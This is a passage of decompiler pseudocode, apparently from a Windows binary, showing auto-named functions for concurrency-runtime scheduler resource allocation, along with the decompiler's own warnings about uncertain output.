      v3 = v2;
    sub_13F142E40((__int64)pExceptionObject, v3);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  return 0i64;
}
// 13F1434F7: write access to const memory at 13F1C5D78 has been detected
// 13F143554: write access to const memory at 13F1C5D78 has been detected
// 13F1C5D60: using guessed type __int64 qword_13F1C5D60;
// 13F1C5D68: using guessed type __int64 qword_13F1C5D68;
// 13F143420: using guessed type char pExceptionObject[8];

//----- (000000013F1435A8) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 sub_13F1435A8()
{
  __int64 result; // rax

  result = sub_13F16A188(0i64);
  qword_13F1C5D98 = 0i64;
  dword_13F1C5D94 = 0;
  return result;
}
// 13F1435B8: write access to const memory at 13F1C5D98 has been detected
// 13F1435C0: write access to const memory at 13F1C5D94 has been detected
// 13F16A188: using guessed type __int64 __fastcall sub_13F16A188(_QWORD);
// 13F1C5D94: using guessed type int dword_13F1C5D94;
// 13F1C5D98: using guessed type __int64 qword_13F1C5D98;

//----- (000000013F1435CC) ----------------------------------------------------
_DWORD *__fastcall sub_13F1435CC(__int64 a1, __int64 a2)
{
  __int64 v2; // r15
  unsigned int v3; // ebp
  __int64 v5; // rbx
  unsigned __int64 v6; // rdi
  _DWORD *result; // rax
  int v8; // er13
  unsigned int v9; // er12
  __int64 v10; // r15
  __int64 v11; // rcx
  __int64 v12; // rdx
  __int64 v13; // r8
  __int64 i; // [rsp+68h] [rbp+10h]

  v2 = *(_QWORD *)(a2 + 32);
  v3 = 0;
  for ( i = v2; v3 < *(_DWORD *)(a1 + 28); ++v3 )
  {
    v5 = 0i64;
    v6 = (unsigned __int64)v3 << 6;
    if ( *(_DWORD *)(v6 + v2 + 8) )
    {
      do
      {
        result = *(_DWORD **)(v6 + v2 + 56);
        v8 = 0;
        v9 = 1;
        if ( *(_DWORD *)(a1 + 12) > 1u )
        {
          v10 = *(_QWORD *)(v6 + v2 + 56);
          do
          {
            result = *(_DWORD **)(a1 + 120);
            v11 = *(_QWORD *)(*(_QWORD *)&result[2 * v9] + 16i64);
            if ( *(_DWORD *)(v11 + 156) )
            {
              v12 = v6 + *(_QWORD *)(v11 + 32);
              v13 = *(_QWORD *)(v12 + 56);
              if ( *(_DWORD *)(v13 + 72 * v5) == 5 )
              {
                if ( *(_DWORD *)(v10 + 72 * v5) == 4 )
                {
                  if ( *(_DWORD *)(v10 + 72 * v5 + 40) || *(_BYTE *)(v13 + 72 * v5 + 64) || v8 )
                  {
                    result = (_DWORD *)sub_13F152CDC(v11, v12, v5);
                  }
                  else
                  {
                    result = *(_DWORD **)(v13 + 72 * v5 + 32);
                    ++*result;
                    *(_DWORD *)(v13 + 72 * v5) = 4;
                    if ( !*(_BYTE *)(v13 + 72 * v5 + 65) )
                      result = (_DWORD *)sub_13F152F78(v11, v12, v5);
                    v8 = 1;
                  }
                }
                else
                {
                  ++**(_DWORD **)(v13 + 72 * v5 + 32);
                  result = *(_DWORD **)(v12 + 56);
                  result[18 * v5] = 4;
                }
              }
            }
            ++v9;
          }
          while ( v9 < *(_DWORD *)(a1 + 12) );
          v2 = i;
        }
        v5 = (unsigned int)(v5 + 1);
      }
      while ( (unsigned int)v5 < *(_DWORD *)(v6 + v2 + 8) );
    }
  }
  return result;
}

//----- (000000013F1436F0) ----------------------------------------------------
__int64 __fastcall sub_13F1436F0(__int64 a1)
{
  unsigned __int128 v2; // rax
  __int64 v3; // rbx
  unsigned int i; // ebp
  __int64 v5; // r15
  unsigned __int64 v6; // rdi
  unsigned __int64 v7; // rsi
  unsigned __int128 v8; // rax
  __int64 v9; // rax
  __int64 v10; // rcx
  __int64 v11; // rax
  __int64 v12; // rax
  __int64 j; // r9
  __int64 v14; // rax
  __int64 v15; // rdx
  __int64 v16; // rcx
  __int64 v17; // r8

  v2 = *(unsigned int *)(a1 + 28) * (unsigned __int128)0x40ui64;
  if ( !is_mul_ok(*(unsigned int *)(a1 + 28), 0x40ui64) )
    *(_QWORD *)&v2 = -1i64;
  v3 = sub_13F1790C4(v2, *((_QWORD *)&v2 + 1));
  sub_13F15EF70(v3, 0, (unsigned __int64)*(unsigned int *)(a1 + 28) << 6);
  for ( i = 0; i < *(_DWORD *)(a1 + 28); ++i )
  {
    v5 = *(_QWORD *)(a1 + 96);
    v6 = (unsigned __int64)i << 6;
    *(_OWORD *)(v6 + v3) = *(_OWORD *)(v6 + v5);
    *(_OWORD *)(v6 + v3 + 16) = *(_OWORD *)(v6 + v5 + 16);
    v7 = *(unsigned int *)(v6 + v3 + 8);
    v8 = *(unsigned int *)(v6 + v3 + 8) * (unsigned __int128)0x48ui64;
    if ( !is_mul_ok(v7, 0x48ui64) )
      *(_QWORD *)&v8 = -1i64;
    v9 = sub_13F1790C4(v8, *((_QWORD *)&v8 + 1));
    v10 = v9;
    if ( v9 )
    {
      if ( v7 )
      {
        v11 = v9 + 16;
        do
        {
          *(_DWORD *)v11 = 0;
          *(_QWORD *)(v11 + 8) = 0i64;
          v11 += 72i64;
          --v7;
        }
        while ( v7 );
      }
    }
    else
    {
      v10 = 0i64;
    }
    v12 = *(unsigned int *)(v6 + v3 + 8);
    *(_QWORD *)(v6 + v3 + 56) = v10;
    sub_13F15EF70(v10, 0, 72 * v12);
    for ( j = 0i64;
          (unsigned int)j < *(_DWORD *)(v6 + v3 + 8);
          *(_QWORD *)(*(_QWORD *)(v6 + v3 + 56) + 8 * v15 + 32) = v17 + *(_QWORD *)(v6 + v5 + 48) + 24i64 )
    {
      v14 = *(_QWORD *)(v6 + v5 + 48);
      v15 = 9 * j;
      v16 = *(_QWORD *)(v6 + v3 + 56);
      v17 = 48 * j;
      j = (unsigned int)(j + 1);
      *(_QWORD *)(v16 + 8 * v15) = *(_QWORD *)(v14 + v17);
      *(_DWORD *)(v16 + 8 * v15 + 8) = *(_DWORD *)(v14 + v17 + 8);
      *(_DWORD *)(*(_QWORD *)(v6 + v3 + 56) + 8 * v15) = 1;
    }
  }
  return v3;
}
// 13F1790C4: using guessed type __int64 __fastcall sub_13F1790C4(_QWORD, _QWORD);

//----- (000000013F143850) ----------------------------------------------------
__int64 __fastcall sub_13F143850(__int64 a1)
{
  __int64 v2; // rax
  __int64 v3; // rdx
  __int64 v4; // rcx
  int v6; // eax
  int v7; // edx
  char pExceptionObject[40]; // [rsp+30h] [rbp-28h] BYREF

  v2 = sub_13F142980(0i64, 0x10000i64);
  *(_QWORD *)(a1 + 104) = v2;
  if ( !v2 )
  {
    v6 = MEMORY[0x76F91760](v4, v3);
    v7 = (unsigned __int16)v6 | 0x80070000;
    if ( v6 <= 0 )
      v7 = v6;
    sub_13F142E40((__int64)pExceptionObject, v7);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  return sub_13F142770();
}
// 13F143895: variable 'v4' is possibly undefined
// 13F143895: variable 'v3' is possibly undefined

//----- (000000013F1438D0) ----------------------------------------------------
__int64 __fastcall sub_13F1438D0(__int64 a1, __int64 a2)
{
  __int64 v4; // rax
  __int64 v5; // rbx
  __int64 v7; // [rsp+48h] [rbp+10h] BYREF
  __int64 v8; // [rsp+50h] [rbp+18h]

  (*(void (__fastcall **)(__int64, __int64 *))(*(_QWORD *)a2 + 16i64))(a2, &v7);
  v4 = sub_13F14059C(272i64);
  v8 = v4;
  v5 = 0i64;
  if ( v4 )
    v5 = sub_13F151960(v4, a2, a1, &v7);
  sub_13F150BB8(&v7);
  return v5;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F14394C) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 sub_13F14394C()
{
  __int64 v0; // rax
  __int64 v1; // rbx
  char v3[8]; // [rsp+28h] [rbp-20h] BYREF
  int v4; // [rsp+30h] [rbp-18h]
  __int64 (__fastcall *v5)(); // [rsp+38h] [rbp-10h]

  if ( _InterlockedExchange(&dword_13F1C5DD8, 1) )
  {
    v4 = 0;
    v5 = sub_13F142C2C;
    do
      sub_13F141BF4((__int64)v3);
    while ( _InterlockedExchange(&dword_13F1C5DD8, 1) );
  }
  v0 = sub_13F14059C(232i64);
  if ( v0 )
    v1 = sub_13F142F28(v0);
  else
    v1 = 0i64;
  _InterlockedIncrement((volatile signed __int32 *)(v1 + 8));
  qword_13F1C5D58 = sub_13F142890(v1);
  dword_13F1C5DD8 = 0;
  return v1;
}
// 13F143A1B: write access to const memory at 13F1C5D58 has been detected
// 13F143A22: write access to const memory at 13F1C5DD8 has been detected
// 13F142C2C: using guessed type __int64 __fastcall sub_13F142C2C();
// 13F14394C: using guessed type __int64 __fastcall sub_13F14394C();
// 13F1C5D58: using guessed type __int64 qword_13F1C5D58;
// 13F1C5DD8: using guessed type int dword_13F1C5DD8;
// 13F14394C: using guessed type char var_20[8];

//----- (000000013F143A38) ----------------------------------------------------
__int64 __fastcall sub_13F143A38(__int64 a1, unsigned int a2, unsigned int a3)
{
  __int64 v3; // rbp
  __int64 v4; // r14
  unsigned int v6; // edi
  __int64 v7; // r9

  v3 = a3;
  v4 = a2;
  v6 = 0;
  sub_13F1419D8(a1 + 48);
  v7 = *(_QWORD *)(a1 + 152);
  if ( v7 )
    v7 = *(_QWORD *)(v7 + 48);
  while ( v7 )
  {
    v6 += *(_DWORD *)(*(_QWORD *)((v4 << 6) + *(_QWORD *)(v7 + 32) + 56) + 72 * v3 + 40);
    if ( v7 == *(_QWORD *)(a1 + 152) )
      v7 = 0i64;
    else
      v7 = *(_QWORD *)(v7 + 48);
  }
  sub_13F141BDC(a1 + 48);
  return v6;
}
// 13F1419D8: using guessed type __int64 __fastcall sub_13F1419D8(_QWORD);
// 13F141BDC: using guessed type __int64 __fastcall sub_13F141BDC(_QWORD);

//----- (000000013F143AE4) ----------------------------------------------------
__int64 __fastcall sub_13F143AE4(__int64 a1, __int64 a2)
{
  unsigned int i; // ebx

  for ( i = 0; i < *(_DWORD *)(a1 + 28); ++i )
    sub_13F14088C(*(_QWORD *)(((unsigned __int64)i << 6) + a2 + 56), a2);
  return sub_13F14088C(a2, a2);
}
// 13F143B0B: variable 'a2' is possibly undefined
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);

//----- (000000013F143B30) ----------------------------------------------------
_QWORD *__fastcall sub_13F143B30(__int64 a1)
{
  unsigned __int64 v2; // rdx
  unsigned __int128 v3; // rax
  unsigned __int64 v4; // kr00_8
  __int64 v5; // rax
  unsigned __int64 v6; // r8
  unsigned __int64 v7; // rbx
  unsigned __int128 v8; // rax
  bool v9; // cf
  unsigned __int64 *v10; // rax
  __int64 v11; // rcx
  unsigned __int64 v12; // r8
  _QWORD *result; // rax

  *(_DWORD *)(a1 + 24) = 0;
  v2 = *(unsigned int *)(a1 + 24);
  *(_DWORD *)(a1 + 28) = 0;
  *(_DWORD *)(a1 + 32) = 0;
  v4 = v2;
  v3 = v2 * (unsigned __int128)0x10ui64;
  if ( !is_mul_ok(v4, 0x10ui64) )
    *(_QWORD *)&v3 = -1i64;
  v5 = sub_13F1790C4(v3, *((_QWORD *)&v3 + 1));
  v6 = 16i64 * *(unsigned int *)(a1 + 24);
  *(_QWORD *)(a1 + 88) = v5;
  sub_13F15EF70(v5, 0, v6);
  v7 = *(unsigned int *)(a1 + 28);
  v8 = *(unsigned int *)(a1 + 28) * (unsigned __int128)0x40u;
  if ( !is_mul_ok(v7, 0x40ui64) )
    *(_QWORD *)&v8 = -1i64;
  v9 = __CFADD__((_QWORD)v8, 8i64);
  *(_QWORD *)&v8 = v8 + 8;
  if ( v9 )
    *(_QWORD *)&v8 = -1i64;
  v10 = (unsigned __int64 *)sub_13F1790C4(v8, *((_QWORD *)&v8 + 1));
  if ( v10 )
  {
    *v10 = v7;
    v11 = (__int64)(v10 + 1);
  }
  else
  {
    v11 = 0i64;
  }
  v12 = (unsigned __int64)*(unsigned int *)(a1 + 28) << 6;
  *(_QWORD *)(a1 + 96) = v11;
  sub_13F15EF70(v11, 0, v12);
  sub_13F145820(*(_QWORD *)(a1 + 96), a1, 0, 0, 0i64, 0, 0);
  result = *(_QWORD **)(a1 + 88);
  *result = 0i64;
  return result;
}
// 13F1790C4: using guessed type __int64 __fastcall sub_13F1790C4(_QWORD, _QWORD);
// 13F1C5D94: using guessed type int dword_13F1C5D94;
// 13F1C5D98: using guessed type __int64 qword_13F1C5D98;

//----- (000000013F143F0C) ----------------------------------------------------
__int64 __fastcall sub_13F143F0C(__int64 a1)
{
  __int64 v1; // rbx
  bool i; // zf
  unsigned int v4; // eax
  __int64 v5; // rcx
  __int64 result; // rax
  unsigned int v7; // [rsp+40h] [rbp+8h] BYREF
  int v8; // [rsp+48h] [rbp+10h] BYREF
  int v9; // [rsp+50h] [rbp+18h] BYREF

  v1 = *(_QWORD *)(a1 + 152);
  for ( i = v1 == 0; ; i = v1 == *(_QWORD *)(a1 + 152) )
  {
    v1 = i ? 0i64 : *(_QWORD *)(v1 + 48);
    if ( !v1 )
      break;
    v4 = *(_DWORD *)(v1 + 168);
    v5 = *(_QWORD *)(v1 + 16);
    v9 = 0;
    v8 = 0;
    v7 = v4;
    (*(void (__fastcall **)(__int64, int *, int *, unsigned int *))(*(_QWORD *)v5 + 8i64))(v5, &v9, &v8, &v7);
    result = v7;
    *(_DWORD *)(v1 + 168) = v7;
  }
  return result;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F143F84) ----------------------------------------------------
bool __fastcall sub_13F143F84(__int64 a1)
{
  __int64 v2; // rbx
  unsigned int v3; // edx
  unsigned int v4; // eax
  int v5; // er8
  unsigned int v6; // ecx
  int v7; // eax
  unsigned int v8; // ecx
  int v9; // er12
  unsigned int v10; // er9
  __int64 v11; // r15
  bool v12; // r13
  __int64 v13; // rbp
  bool v14; // cl
  unsigned int v15; // esi
  __int64 v16; // r10
  unsigned int v17; // er11
  __int64 v18; // r8
  unsigned int *v19; // r13
  __int64 v20; // rax
  __int64 v21; // rdx
  unsigned int v22; // ecx
  __int64 v23; // rsi
  __int64 v24; // rdi
  __int64 v25; // rax
  unsigned int v26; // eax
  bool v28; // [rsp+60h] [rbp+8h]
  __int64 v29; // [rsp+68h] [rbp+10h]

  if ( !*(_QWORD *)(a1 + 152) )
    return 1;
  v2 = *(_QWORD *)(*(_QWORD *)(a1 + 152) + 48i64);
  v3 = *(_DWORD *)(v2 + 236);
  v4 = v3;
  v5 = *(_DWORD *)(v2 + 176);
  v6 = v5 + *(_DWORD *)(v2 + 232);
  if ( v3 >= v6 )
    v4 = v5 + *(_DWORD *)(v2 + 232);
  if ( *(_DWORD *)(v2 + 208) < v4 || *(_DWORD *)(v2 + 216) )
  {
    if ( v3 >= v6 )
      v3 = v5 + *(_DWORD *)(v2 + 232);
    v7 = sub_13F151F48((_DWORD *)v2, v3);
    v8 = *(_DWORD *)(v2 + 236);
    v9 = v7 - *(_DWORD *)(v2 + 208);
    v5 = *(_DWORD *)(v2 + 176);
    v10 = *(_DWORD *)(a1 + 28);
    v11 = *(_QWORD *)(v2 + 40);
    if ( v8 >= v5 + *(_DWORD *)(v2 + 232) )
      v8 = v5 + *(_DWORD *)(v2 + 232);
    v29 = *(_QWORD *)(v2 + 32);
    v12 = v8 != *(_DWORD *)(a1 + 32);
    v13 = 0i64;
    if ( v10 )
    {
      do
      {
        v14 = 0;
        if ( v9 )
          v14 = v12;
        v28 = v14;
        v12 = v14;
        if ( v14 )
        {
          v15 = *(_DWORD *)(v11 + 4 * v13);
          v16 = (unsigned int)(v13 + 1);
          v17 = v13;
          v18 = v29 + ((unsigned __int64)v15 << 6);
          if ( (unsigned int)v16 < v10 )
          {
            v19 = (unsigned int *)(v11 + 4 * v16);
            do
            {
              v20 = (unsigned int)v16;
              v21 = v29 + ((unsigned __int64)*v19 << 6);
              v22 = *(_DWORD *)(v21 + 36);
              if ( v22 <= *(_DWORD *)(v18 + 36) )
                v20 = v17;
              LODWORD(v16) = v16 + 1;
              ++v19;
              v17 = v20;
              if ( v22 <= *(_DWORD *)(v18 + 36) )
                v21 = v18;
              v18 = v21;
            }
            while ( (unsigned int)v16 < v10 );
            v12 = v28;
            if ( (_DWORD)v13 != (_DWORD)v20 )
            {
              *(_DWORD *)(v11 + 4 * v13) = *(_DWORD *)(v11 + 4 * v20);
              *(_DWORD *)(v11 + 4i64 * (unsigned int)v20) = v15;
            }
          }
        }
        v23 = 0i64;
        v24 = v29 + ((unsigned __int64)*(unsigned int *)(v11 + 4 * v13) << 6);
        if ( *(_DWORD *)(v24 + 8) )
        {
          do
          {
            v25 = *(_QWORD *)(v24 + 56);
            if ( *(_DWORD *)(v25 + 72 * v23) == 1 )
            {
              if ( v9 )
              {
                ++**(_DWORD **)(v25 + 72 * v23 + 32);
                sub_13F151C44((_DWORD *)v2, v24, v23, 0);
                --v9;
              }
            }
            else if ( *(_BYTE *)(v25 + 72 * v23 + 65) )
            {
              sub_13F152F78(v2, v24, v23);
            }
            v23 = (unsigned int)(v23 + 1);
          }
          while ( (unsigned int)v23 < *(_DWORD *)(v24 + 8) );
        }
        v10 = *(_DWORD *)(a1 + 28);
        v13 = (unsigned int)(v13 + 1);
      }
      while ( (unsigned int)v13 < v10 );
      v5 = *(_DWORD *)(v2 + 176);
    }
  }
  if ( *(_DWORD *)(v2 + 180) == v5 )
  {
    sub_13F1474A8(a1, 0i64);
    v5 = *(_DWORD *)(v2 + 176);
  }
  v26 = *(_DWORD *)(v2 + 236);
  if ( v26 >= v5 + *(_DWORD *)(v2 + 232) )
    v26 = v5 + *(_DWORD *)(v2 + 232);
  return *(_DWORD *)(v2 + 208) == v26;
}

//----- (000000013F144188) ----------------------------------------------------
void __fastcall sub_13F144188(__int64 a1, int a2, unsigned int a3, unsigned int a4, unsigned int a5, unsigned int a6)
{
  unsigned int v6; // er13
  __int64 v8; // rbx
  char v10; // r15
  __int64 v11; // rsi
  __int64 v12; // r14
  _DWORD *v13; // r9
  unsigned int v14; // er10
  __int64 v15; // r9
  __int64 v16; // r11
  __int64 v17; // rsi
  unsigned int v18; // er14
  __int64 *v19; // r15
  __int64 v20; // rdx
  unsigned int v21; // er8
  __int64 v22; // r9
  __int64 v23; // r8
  __int64 v24; // r15
  __int64 v25; // rsi
  __int64 v26; // r12
  __int64 v27; // r14
  unsigned int v28; // [rsp+80h] [rbp+18h] BYREF
  unsigned int v29; // [rsp+88h] [rbp+20h] BYREF

  v29 = a4;
  v28 = a3;
  v6 = a6;
  v8 = a5;
  do
  {
    v10 = 0;
    if ( !(_DWORD)v8 )
      break;
    v11 = 0i64;
    v12 = v8;
    do
    {
      v13 = *(_DWORD **)(v11 + *(_QWORD *)(a1 + 136));
      if ( v13[1] )
      {
        if ( v13[10] > v13[11] )
        {
          v10 = 1;
          if ( sub_13F145018(a1, &v28, &v29, (__int64)v13, v6) )
            --a2;
        }
      }
      v11 += 8i64;
      --v12;
    }
    while ( v12 );
  }
  while ( v10 );
  if ( a2 )
  {
    v14 = 0;
    if ( (_DWORD)v8 )
    {
      v15 = *(_QWORD *)(a1 + 136);
      while ( 1 )
      {
        v16 = v14 + 1;
        LODWORD(v17) = v14;
        v18 = v16;
        if ( (unsigned int)v16 < (unsigned int)v8 )
        {
          v19 = (__int64 *)(v15 + 8 * v16);
          do
          {
            v20 = *v19;
            v21 = v18;
            ++v19;
            if ( *(_DWORD *)(v20 + 4) <= *(_DWORD *)(*(_QWORD *)(v15 + 8i64 * (unsigned int)v17) + 4i64) )
              v21 = v17;
            ++v18;
            v17 = v21;
          }
          while ( v18 < (unsigned int)v8 );
          if ( v14 != v21 )
          {
            v22 = *(_QWORD *)(a1 + 136);
            v23 = *(_QWORD *)(v22 + 8i64 * v14);
            *(_QWORD *)(v22 + 8i64 * v14) = *(_QWORD *)(v22 + 8 * v17);
            *(_QWORD *)(*(_QWORD *)(a1 + 136) + 8 * v17) = v23;
          }
        }
        v15 = *(_QWORD *)(a1 + 136);
        if ( !*(_DWORD *)(*(_QWORD *)(v15 + 8i64 * v14) + 4i64) )
          break;
        ++v14;
        if ( (unsigned int)v16 >= (unsigned int)v8 )
          goto LABEL_24;
      }
      LODWORD(v8) = v14;
    }
LABEL_24:
    v24 = (unsigned int)v8;
    do
    {
      if ( (_DWORD)v24 )
      {
        v25 = 0i64;
        v26 = v24;
        do
        {
          v27 = *(_QWORD *)(v25 + *(_QWORD *)(a1 + 136));
          if ( *(_DWORD *)(v27 + 4) )
          {
            a2 -= sub_13F144B2C(a1, &v28, &v29, v27, v8, v6);
            if ( !*(_DWORD *)(v27 + 4) )
              LODWORD(v8) = v8 - 1;
          }
          v25 += 8i64;
          --v26;
        }
        while ( v26 );
      }
    }
    while ( a2 );
  }
}

//----- (000000013F144324) ----------------------------------------------------
void __fastcall sub_13F144324(__int64 a1, unsigned int a2, unsigned int a3)
{
  char v6; // r13
  unsigned int v7; // er14
  __int64 v8; // r15
  __int64 v9; // rdi
  __int64 v10; // r9
  __int64 v11; // rdx
  __int64 v12; // r8
  __int64 v13; // r12
  unsigned int v14; // er10
  __int64 v15; // r9
  __int64 v16; // r11
  __int64 v17; // rdi
  unsigned int v18; // er14
  __int64 *v19; // r15
  __int64 v20; // rdx
  unsigned int v21; // er8
  __int64 v22; // r9
  __int64 v23; // r8
  unsigned int v24; // er12
  unsigned int v25; // edi
  __int64 v26; // r14
  __int64 v27; // rax
  __int64 v28; // r15
  __int64 v29; // [rsp+78h] [rbp+20h]

  do
  {
    v6 = 0;
    v7 = 0;
    if ( !a3 )
      break;
    v8 = 0i64;
    do
    {
      if ( !a2 )
        break;
      v9 = *(_QWORD *)(v8 + *(_QWORD *)(a1 + 136));
      if ( *(_DWORD *)(v9 + 4) )
      {
        v10 = *(unsigned int *)(v9 + 44);
        if ( *(_DWORD *)(v9 + 40) > (unsigned int)v10 )
        {
          v11 = *(_QWORD *)(v9 + 16);
          v6 = 1;
          v29 = *(_QWORD *)(v11 + 32);
          v12 = *(unsigned int *)(*(_QWORD *)(v11 + 40) + 4 * v10);
          v13 = v12 << 6;
          if ( *(_DWORD *)(*(_QWORD *)(a1 + 96) + (v12 << 6) + 40) )
          {
            sub_13F14477C(a1, v11, v12, 1, 1);
            if ( *(_DWORD *)(v13 + v29 + 36) == *(_DWORD *)(v13 + v29 + 8) )
              ++*(_DWORD *)(v9 + 44);
            --*(_DWORD *)(v9 + 4);
            --a2;
          }
          else
          {
            *(_DWORD *)(v9 + 44) = v10 + 1;
          }
        }
      }
      ++v7;
      v8 += 8i64;
    }
    while ( v7 < a3 );
  }
  while ( v6 );
  if ( a2 )
  {
    v14 = 0;
    if ( a3 )
    {
      v15 = *(_QWORD *)(a1 + 136);
      while ( 1 )
      {
        v16 = v14 + 1;
        LODWORD(v17) = v14;
        v18 = v16;
        if ( (unsigned int)v16 < a3 )
        {
          v19 = (__int64 *)(v15 + 8 * v16);
          do
          {
            v20 = *v19;
            v21 = v18;
            ++v19;
            if ( *(_DWORD *)(v20 + 4) <= *(_DWORD *)(*(_QWORD *)(v15 + 8i64 * (unsigned int)v17) + 4i64) )
              v21 = v17;
            ++v18;
            v17 = v21;
          }
          while ( v18 < a3 );
          if ( v14 != v21 )
          {
            v22 = *(_QWORD *)(a1 + 136);
            v23 = *(_QWORD *)(v22 + 8i64 * v14);
            *(_QWORD *)(v22 + 8i64 * v14) = *(_QWORD *)(v22 + 8 * v17);
            *(_QWORD *)(*(_QWORD *)(a1 + 136) + 8 * v17) = v23;
          }
        }
        v15 = *(_QWORD *)(a1 + 136);
        if ( !*(_DWORD *)(*(_QWORD *)(v15 + 8i64 * v14) + 4i64) )
          break;
        ++v14;
        if ( (unsigned int)v16 >= a3 )
          goto LABEL_27;
      }
      a3 = v14;
    }
LABEL_27:
    v24 = a3;
    while ( 1 )
    {
      v25 = 0;
      if ( v24 )
        break;
LABEL_35:
      if ( !a2 )
        return;
    }
    v26 = 0i64;
    while ( a2 )
    {
      v27 = *(_QWORD *)(a1 + 136);
      v28 = *(_QWORD *)(v26 + v27);
      if ( *(_DWORD *)(v28 + 4) )
      {
        a2 -= sub_13F144EF4(a1, a2, *(_QWORD *)(v26 + v27), a3);
        if ( !*(_DWORD *)(v28 + 4) )
          --a3;
      }
      ++v25;
      v26 += 8i64;
      if ( v25 >= v24 )
        goto LABEL_35;
    }
  }
}

//----- (000000013F1444FC) ----------------------------------------------------
__int64 __fastcall sub_13F1444FC(__int64 a1, __int64 a2)
{
  unsigned int v3; // er12
  unsigned int v4; // er13
  unsigned int i; // er9
  __int64 v6; // r10
  __int64 v7; // rcx
  __int64 v8; // r8
  unsigned int v9; // edx
  unsigned int v10; // eax
  unsigned int v11; // ecx
  unsigned int v12; // er15
  unsigned int j; // er8
  unsigned int v14; // er9
  unsigned __int64 v15; // rcx
  _DWORD *v16; // rdx
  int v17; // eax
  int v18; // er14
  unsigned int k; // eax
  unsigned int v20; // esi
  unsigned int v21; // ebx
  unsigned int v22; // edx
  __int64 v23; // r8
  __int64 v24; // rcx
  unsigned int v25; // ebp
  unsigned int v26; // eax
  unsigned int v27; // er9
  unsigned int v28; // er8
  int v29; // edx
  unsigned int v30; // ebx
  unsigned int v31; // eax

  sub_13F146098(a1, a2);
  sub_13F1461EC(a1);
  v3 = 0;
  v4 = 0;
  for ( i = 0; i < *(_DWORD *)(a1 + 12); ++i )
  {
    v6 = *(_QWORD *)(*(_QWORD *)(a1 + 120) + 8i64 * i);
    if ( *(_DWORD *)(*(_QWORD *)(v6 + 16) + 208i64) > *(_DWORD *)(v6 + 36) )
    {
      v7 = v4++;
      *(_QWORD *)(*(_QWORD *)(a1 + 128) + 8 * v7) = v6;
      v8 = *(_QWORD *)(v6 + 16);
      v9 = *(_DWORD *)(v6 + 28);
      v10 = *(_DWORD *)(v8 + 208) - *(_DWORD *)(v6 + 36);
      v3 += v10;
      if ( v9 >= v10 )
        v9 = *(_DWORD *)(v8 + 208) - *(_DWORD *)(v6 + 36);
      *(_DWORD *)(v6 + 40) = v9;
      v11 = *(_DWORD *)(v8 + 216) - *(_DWORD *)(v6 + 28);
      if ( v11 >= *(_DWORD *)(v8 + 208) - *(_DWORD *)(v6 + 36) - v9 )
        v11 = *(_DWORD *)(v8 + 208) - *(_DWORD *)(v6 + 36) - v9;
      *(_DWORD *)(v6 + 44) = v11;
      *(_DWORD *)(v6 + 48) = *(_DWORD *)(v8 + 208) - *(_DWORD *)(v6 + 36) - v9 - v11;
    }
  }
  v12 = 0;
  *(_DWORD *)(a1 + 36) = 0;
  for ( j = 0; j < *(_DWORD *)(a1 + 28); ++j )
  {
    v14 = 0;
    v15 = *(_QWORD *)(a1 + 96) + ((unsigned __int64)j << 6);
    if ( *(_DWORD *)(v15 + 8) )
    {
      do
      {
        v16 = (_DWORD *)(*(_QWORD *)(v15 + 48) + 48i64 * v14);
        v17 = v16[6];
        if ( v17 )
        {
          if ( v17 == v16[9] )
          {
            *v16 = 6;
            ++*(_DWORD *)(v15 + 40);
            ++*(_DWORD *)(a1 + 36);
          }
        }
        else
        {
          *v16 = 2;
          ++*(_DWORD *)(v15 + 12);
          ++v12;
        }
        ++v14;
      }
      while ( v14 < *(_DWORD *)(v15 + 8) );
    }
  }
  v18 = v12 + v3;
  *(_DWORD *)(a1 + 40) = 0;
  for ( k = 0; (v18 || *(_DWORD *)(a1 + 36)) && k < 2; k = *(_DWORD *)(a1 + 40) )
  {
    if ( k == 1 )
      sub_13F1457BC(a1);
    v20 = 0;
    v21 = 0;
    v22 = 0;
    if ( *(_DWORD *)(a1 + 12) )
    {
      do
      {
        v23 = *(_QWORD *)(*(_QWORD *)(a1 + 120) + 8i64 * v22);
        if ( *(_DWORD *)(*(_QWORD *)(v23 + 16) + 208i64) < *(_DWORD *)(v23 + 36) )
        {
          v24 = v20++;
          *(_QWORD *)(*(_QWORD *)(a1 + 136) + 8 * v24) = v23;
          v21 += *(_DWORD *)(v23 + 36) - *(_DWORD *)(*(_QWORD *)(v23 + 16) + 208i64);
        }
        ++v22;
      }
      while ( v22 < *(_DWORD *)(a1 + 12) );
      if ( v20 )
      {
        if ( v18 )
        {
          v25 = sub_13F143250(a1, v18, v21, v20);
          v26 = sub_13F14633C(a1, v20);
          v27 = 0;
          v28 = v25;
          if ( v12 < v25 )
            v28 = v12;
          v12 -= v28;
          if ( v28 < v25 )
          {
            v27 = v3;
            if ( v25 - v28 < v3 )
              v27 = v25 - v28;
            v3 -= v27;
          }
          sub_13F144188(a1, v25, v28, v27, v26, v4);
          v18 -= v25;
          v21 -= v25;
        }
        if ( v21 )
        {
          v29 = *(_DWORD *)(a1 + 36);
          if ( v29 )
          {
            v30 = sub_13F143250(a1, v29, v21, v20);
            v31 = sub_13F14633C(a1, v20);
            sub_13F144324(a1, v30, v31);
            *(_DWORD *)(a1 + 36) -= v30;
          }
        }
      }
    }
    ++*(_DWORD *)(a1 + 40);
  }
  return sub_13F147180(a1);
}

//----- (000000013F14477C) ----------------------------------------------------
char *__fastcall sub_13F14477C(__int64 a1, __int64 a2, unsigned int a3, int a4, char a5)
{
  __int64 v5; // rdi
  unsigned __int64 v8; // rbx
  __int64 i; // rbp
  _DWORD *v10; // rcx
  char *result; // rax

  v5 = *(_QWORD *)(a1 + 96);
  v8 = (unsigned __int64)a3 << 6;
  for ( i = 0i64; ; i = (unsigned int)(i + 1) )
  {
    if ( (v10 = (_DWORD *)(*(_QWORD *)(v8 + v5 + 48) + 48 * i), *v10 == 2) && !a5 || *v10 == 6 && a5 )
    {
      ++v10[6];
      *v10 = 0;
      if ( a5 )
        --*(_DWORD *)(v8 + v5 + 40);
      else
